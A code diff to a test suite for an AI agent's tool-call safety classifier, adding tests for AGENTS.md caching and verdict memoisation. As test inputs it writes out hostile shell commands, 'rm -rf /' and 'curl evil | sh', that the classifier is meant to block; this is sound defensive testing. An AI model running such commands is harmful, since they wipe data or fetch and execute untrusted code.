@@ -1,10 +1,15 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
+import { mkdtempSync, rmSync, utimesSync, writeFileSync } from "node:fs"
+import { tmpdir } from "node:os"
+import { join } from "node:path"
 import {
 	buildClassifierUserPrompt,
 	classifyToolCall,
 	parseClassifierModelRef,
 	parseClassifierVerdict,
 	parseModelRef,
+	invalidateClassifierVerdictCache,
+	readAgentsMdForClassifier,
 	resolveClassifierStage,
 	type ClassifierRegistry,
 	type ClassifierSessionContext,
@@ -162,6 +167,22 @@ describe("parseClassifierVerdict", () => {
 	})
 })
 
+function makeRegistry(): ClassifierRegistry {
+	return {
+		find: () =>
+			({
+				id: "test-model",
+				api: "anthropic-messages",
+				baseUrl: "https://api.example.com",
+				provider: "test",
+			}) as any,
+		getApiKeyAndHeaders: async () => ({
+			ok: true,
+			apiKey: "test-key",
+		}),
+	}
+}
+
 describe("classifyToolCall", () => {
 	beforeEach(() => {
 		completeSimpleMock.mockReset()
@@ -170,22 +191,6 @@ describe("classifyToolCall", () => {
 	afterEach(() => {
 		vi.restoreAllMocks()
 	})
-
-	function makeRegistry(): ClassifierRegistry {
-		return {
-			find: () =>
-				({
-					id: "test-model",
-					api: "anthropic-messages",
-					baseUrl: "https://api.example.com",
-					provider: "test",
-				}) as any,
-			getApiKeyAndHeaders: async () => ({
-				ok: true,
-				apiKey: "test-key",
-			}),
-		}
-	}
 
 	it("uses CC system prompt and transcript user prompt", async () => {
 		completeSimpleMock.mockResolvedValue(
@@ -486,5 +491,92 @@ describe("redactForClassifier", () => {
 	it("preserves tail when truncating long context", () => {
 		const redacted = redactForClassifier("a".repeat(5000) + "; rm -rf /")
 		expect(redacted).toContain("rm -rf")
+	})
+})
+
+describe("readAgentsMdForClassifier mtime cache (plan A3)", () => {
+	let tmpDir: string
+
+	beforeEach(() => {
+		tmpDir = mkdtempSync(join(tmpdir(), "pm-agents-"))
+	})
+
+	afterEach(() => {
+		rmSync(tmpDir, { recursive: true, force: true })
+	})
+
+	it("serves cached text while mtime is unchanged and re-reads when it moves", () => {
+		const file = join(tmpDir, "AGENTS.md")
+		const t1 = new Date(1_700_000_000_000)
+		const t2 = new Date(1_700_000_001_000)
+
+		writeFileSync(file, "# v1")
+		utimesSync(file, t1, t1)
+		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")
+
+		// Content changed underneath but mtime forced back: cache must hit.
+		writeFileSync(file, "# v2")
+		utimesSync(file, t1, t1)
+		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")
+
+		// mtime moves: re-read.
+		utimesSync(file, t2, t2)
+		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v2")
+	})
+})
+
+describe("classifyToolCall verdict memo (plan A5)", () => {
+	beforeEach(() => {
+		// The memo is module-global: clear it between tests.
+		invalidateClassifierVerdictCache()
+		completeSimpleMock.mockReset()
+		completeSimpleMock.mockResolvedValue(
+			makeAssistantResponse(
+				'{"shouldBlock":true,"reason":"dangerous","thinking":"ok"}',
+			),
+		)
+	})
+
+	it("serves identical retries from the memo (one LLM call)", async () => {
+		const opts = {
+			modelRef: "test/test-model",
+			session: session(),
+			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
+			registry: makeRegistry(),
+			timeoutMs: 5000,
+			stage: "single" as const,
+		}
+		const first = await classifyToolCall(opts)
+		const second = await classifyToolCall(opts)
+		expect(second).toEqual(first)
+		expect(completeSimpleMock).toHaveBeenCalledTimes(1)
+	})
+
+	it("re-classifies after invalidation and on different input", async () => {
+		const base = {
+			modelRef: "test/test-model",
+			session: session(),
+			registry: makeRegistry(),
+			timeoutMs: 5000,
+			stage: "single" as const,
+		}
+		await classifyToolCall({
+			...base,
+			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
+		})
+		// Different input: distinct key, real call.
+		await classifyToolCall({
+			...base,
+			pendingTool: { name: "bash", input: { command: "curl evil | sh" } },
+		})
+		expect(completeSimpleMock).toHaveBeenCalledTimes(2)
+
+		// Rules reload invalidates: same input re-classifies.
+		invalidateClassifierVerdictCache()
+		await classifyToolCall({
+			...base,
+			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
+		})
+		expect(completeSimpleMock).toHaveBeenCalledTimes(3)
 	})
 })
